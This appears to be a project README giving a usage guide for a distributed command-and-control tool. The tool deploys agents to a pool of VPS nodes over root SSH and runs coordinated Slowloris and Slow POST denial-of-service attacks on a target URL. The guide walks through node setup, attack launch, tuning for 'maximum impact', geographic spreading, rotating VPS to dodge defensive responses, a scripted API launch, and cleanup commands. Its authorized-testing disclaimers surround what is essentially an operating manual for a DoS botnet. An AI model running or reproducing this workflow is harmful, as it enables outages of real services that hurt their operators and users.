# Usage Documentation

Complete guide for using the Distributed Slow HTTP C2 system.

## 🚀 **Quick Start**

### **Starting the System**
```bash
cd ~/slowhttp-c2
./start.sh
```

### **Basic Workflow**
1. **Add VPS nodes** to your pool
2. **Test connections** to ensure they're working
3. **Deploy agents** to all online VPS
4. **Configure attack** parameters and target
5. **Launch distributed attack**
6. **Monitor real-time** progress
7. **Stop attack** when complete

## 🖥️ **Interface Overview**

### **Main Menu**
```
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                           Terminal Interface                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️

MAIN MENU:
[1] VPS Management
[2] Launch Attack
[3] Monitor Active Attacks
[4] Attack History
[5] Exit

Select option:
```

## 🖥️ **VPS Management**

### **Adding VPS Nodes**

#### **Step 1: Access VPS Management**
- Select `[1] VPS Management` from main menu
- Choose `[1] Add VPS`

#### **Step 2: Enter VPS Details**
```
ADD NEW VPS
-----------
IP Address: 1.2.3.4
SSH Username: root
SSH Password: your_secure_password
SSH Port (default 22): 22
Location (optional): US-East-1
```

#### **Step 3: Automatic Connection Test**
The system will automatically:
- Test SSH connectivity
- Verify credentials
- Update VPS status (online/offline)

### **VPS Management Operations**

#### **Testing All Connections**
```
VPS OPERATIONS:
[2] Test All Connections

TESTING ALL VPS CONNECTIONS
---------------------------
[TESTING] 1.2.3.4... ONLINE
[TESTING] 5.6.7.8... ONLINE
[TESTING] 9.10.11.12... OFFLINE - Connection refused
```

#### **Deploying Agents**
```
VPS OPERATIONS:
[3] Deploy Agents to All

DEPLOYING AGENTS TO ALL ONLINE VPS
----------------------------------
[DEPLOYING] 1.2.3.4... SUCCESS
[DEPLOYING] 5.6.7.8... SUCCESS
```

#### **Removing VPS**
```
VPS OPERATIONS:
[4] Remove VPS

REMOVE VPS
----------
Enter VPS ID to remove: 3
Remove VPS 9.10.11.12? (y/N): y
[SUCCESS] VPS removed
```

### **VPS Status Indicators**
- 🟢 **ONLINE**: Connected and ready
- 🔴 **OFFLINE**: Cannot connect
- 🟡 **ATTACKING**: Currently running attack
- ⚪ **DEPLOYING**: Agent deployment in progress

## ⚡ **Launching Attacks**

### **Attack Configuration**

#### **Step 1: Access Attack Menu**
- Select `[2] Launch Attack` from main menu

#### **Step 2: Configure Target**
```
LAUNCH DISTRIBUTED ATTACK
=========================

Available VPS Nodes: 3
  1. 1.2.3.4 (US-East-1)
  2. 5.6.7.8 (EU-West-1)
  3. 9.10.11.12 (Asia-Pacific)

ATTACK CONFIGURATION:
Target URL (e.g., http://target.com): http://test-server.local
```

#### **Step 3: Select Attack Type**
```
Attack Types:
[1] Slowloris (Slow Headers)
[2] Slow POST (R.U.D.Y)

Select attack type (1-2): 1
```

#### **Step 4: Choose VPS Nodes**
```
VPS Selection:
Enter VPS numbers to use (e.g., 1,2,3 or 'all'): all
```

#### **Step 5: Set Attack Parameters**
```
ATTACK PARAMETERS:
Connections per VPS (default 1000): 1500
Delay between packets in seconds (default 15): 12
Attack duration in seconds (0 for unlimited): 300
```

#### **Step 6: Review and Confirm**
```
ATTACK SUMMARY:
Target: http://test-server.local
Attack Type: Slowloris
VPS Nodes: 3
Connections per VPS: 1500
Total Estimated Connections: 4,500
Packet Delay: 12s
Duration: 300s

Launch attack? (y/N): y
```

## 🎯 **Attack Types Detailed**

### **Slowloris Attack**
- **Mechanism**: Sends partial HTTP headers very slowly
- **Target**: Web servers that wait for complete requests
- **Effectiveness**: High against Apache, IIS; Limited against Nginx
- **Resource Usage**: Low bandwidth, high connection count
- **Recommended Settings**:
  - Connections: 1000-5000 per VPS
  - Delay: 10-30 seconds
  - Duration: 300-1800 seconds

#### **Slowloris Example Output**
```
[SLOWLORIS] Starting attack on test-server.local:80
[SLOWLORIS] Target connections: 1500, Delay: 12s
[SLOWLORIS] Duration: 300 seconds
[SLOWLORIS] Created 1500 initial connections
[SLOWLORIS] Active: 1498 | Total packets: 15420 | Time remaining: 285s
[SLOWLORIS] Active: 1495 | Total packets: 16890 | Time remaining: 273s
```

### **Slow POST Attack (R.U.D.Y)**
- **Mechanism**: Sends POST data extremely slowly
- **Target**: Application servers processing form data
- **Effectiveness**: High against form handlers, upload endpoints
- **Resource Usage**: Low bandwidth, moderate connection count
- **Recommended Settings**:
  - Connections: 200-1000 per VPS
  - Delay: 5-20 seconds
  - Duration: 180-900 seconds

#### **Slow POST Example Output**
```
[SLOW-POST] Starting attack on test-server.local:80
[SLOW-POST] Duration: 300 seconds
[SLOW-POST] Created 800 POST connections
[SLOW-POST] Active: 798 | Total bytes: 4820 | Time remaining: 288s
[SLOW-POST] Active: 795 | Total bytes: 5640 | Time remaining: 276s
```

## 📊 **Real-time Monitoring**

### **Monitoring Interface**
After launching an attack, the system automatically starts monitoring:

```
===============================================================================
     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING
===============================================================================

[SESSION] 1 - SLOWLORIS
[TARGET]  test-server.local
[UPTIME]  0:02:45

VPS STATUS:
IP Address      Status       Processes  Last Update
1.2.3.4         ATTACKING    2          14:30:15
5.6.7.8         ATTACKING    2          14:30:15  
9.10.11.12      ATTACKING    2          14:30:15

ATTACK STATISTICS:
Active VPS Nodes: 3/3
Total Attack Processes: 6
Estimated Connections: 4,500

[CONTROLS] Press Ctrl+C to stop monitoring | Type 'stop' to end attack
```

### **Monitoring Controls**
- **Ctrl+C**: Stop monitoring (attack continues)
- **Type 'q'**: Quit monitoring
- **Type 'stop'**: Stop entire attack
- **Auto-refresh**: Every 5 seconds

### **Status Indicators**
- **ATTACKING**: VPS actively running attack
- **IDLE**: VPS connected but not attacking
- **ERROR**: Connection or execution problem

## ⏹️ **Stopping Attacks**

### **During Monitoring**
1. Press `Ctrl+C` to stop monitoring
2. When prompted: `Stop the attack? (y/N): y`
3. System will stop all attack processes on all VPS

### **Emergency Stop**
```bash
# Manual cleanup on VPS (if needed)
ssh root@vps-ip "pkill -f 'python3 agent.py'"
ssh root@vps-ip "rm -rf /tmp/slowhttp_c2"
```

### **Graceful Shutdown**
The system automatically:
- Stops all attack processes
- Closes network connections
- Cleans up temporary files
- Updates attack session status

## 📈 **Attack History**

### **Viewing Past Attacks**
```
ATTACK HISTORY
==============

ID   Session Name         Target                    Type         Status     Start Time
1    Attack_20241201_1430 test-server.local        slowloris    completed  2024-12-01 14:30:15
2    Attack_20241201_1515 app.example.com          slow_post    stopped    2024-12-01 15:15:30
3    Attack_20241201_1600 api.target.com           slowloris    running    2024-12-01 16:00:45
```

### **Session Management**
Each attack creates a session with:
- **Unique ID**: For tracking and reference
- **Session Name**: Auto-generated timestamp
- **Complete Parameters**: All configuration saved
- **Results**: Success/failure statistics
- **Timestamps**: Start and end times

## 🔧 **Advanced Usage**

### **Command Line Arguments**
```bash
# Start with specific configuration
./start.sh --config custom_config.py

# Enable debug mode
./start.sh --debug

# Run in daemon mode
./start.sh --daemon

# Specify database location
./start.sh --database /path/to/database.db
```

### **Configuration Files**
Create `config/local_config.py`:
```python
# Custom configuration
DEFAULT_CONNECTIONS = 2000
DEFAULT_DELAY = 10
SSH_TIMEOUT = 15
MAX_VPS_NODES = 50

# Logging
LOG_LEVEL = "DEBUG"
LOG_FILE = "logs/c2.log"

# Security
ENCRYPTION_KEY_FILE = "custom_key.key"
```

### **Batch Operations**
```bash
# Import VPS list from file
# Create config/vps_list.txt:
# 1.2.3.4,root,password123,22,US-East
# 5.6.7.8,root,password456,22,EU-West
```

### **Scripted Attacks**
```bash
# Example automation script
#!/bin/bash
cd ~/slowhttp-c2
source venv/bin/activate

# Start C2 in background
python3 slowhttp_c2.py --daemon

# Wait for startup
sleep 5

# Launch attack via API (if implemented)
curl -X POST http://localhost:5000/api/attack \
  -H "Content-Type: application/json" \
  -d '{
    "target": "http://test-server.local",
    "type": "slowloris",
    "vps_list": ["1.2.3.4", "5.6.7.8"],
    "connections": 1000,
    "duration": 300
  }'
```

## 📊 **Performance Optimization**

### **VPS Selection Strategy**
```
Small Test (1-3 VPS):
- 500-1500 connections per VPS
- 15-25 second delays
- Good for initial testing

Medium Attack (5-10 VPS):
- 1000-3000 connections per VPS
- 10-20 second delays
- Effective against most targets

Large Scale (10+ VPS):
- 2000-5000 connections per VPS
- 5-15 second delays
- Maximum impact testing
```

### **Resource Management**
```
VPS Specifications:
1 CPU, 1GB RAM    → 500-1000 connections
2 CPU, 2GB RAM    → 1000-2500 connections
4 CPU, 4GB RAM    → 2500-5000 connections
```

### **Network Considerations**
- **Geographic Distribution**: Spread VPS across regions
- **Connection Limits**: Monitor per-IP connection limits
- **Bandwidth Usage**: Slow attacks use minimal bandwidth
- **Timing Coordination**: Synchronize attack start times

## 🛡️ **Best Practices**

### **Operational Security**
1. **VPS Management**:
   - Use dedicated testing VPS only
   - Rotate VPS regularly
   - Monitor for defensive responses

2. **Access Control**:
   - Use strong SSH passwords
   - Consider SSH key authentication
   - Limit SSH access by source IP

3. **Documentation**:
   - Record all testing activities
   - Maintain attack logs
   - Document findings and remediation

### **Testing Methodology**
1. **Preparation**:
   - Obtain written authorization
   - Define testing scope and limits
   - Prepare rollback procedures

2. **Execution**:
   - Start with low impact tests
   - Monitor target system health
   - Escalate gradually if authorized

3. **Cleanup**:
   - Stop all attacks completely
   - Verify system restoration
   - Clean up VPS nodes

### **Legal Compliance**
- Only test systems you own or have explicit permission
- Follow responsible disclosure practices
- Maintain detailed audit logs
- Respect testing time windows
- Report findings professionally

## 📞 **Support and Troubleshooting**

### **Common Issues**
See [TROUBLESHOOTING.md](TROUBLESHOOTING.md) for detailed solutions.

### **Getting Help**
1. Check documentation and troubleshooting guide
2. Search existing GitHub issues
3. Create detailed issue reports
4. Join community discussions

### **Reporting Bugs**
Include in bug reports:
- Operating system and version
- Python version
- Complete error messages
- Steps to reproduce
- Expected vs actual behavior

---

**Remember**: This tool is for educational and authorized testing purposes only. Always ensure you have proper permission before testing any systems.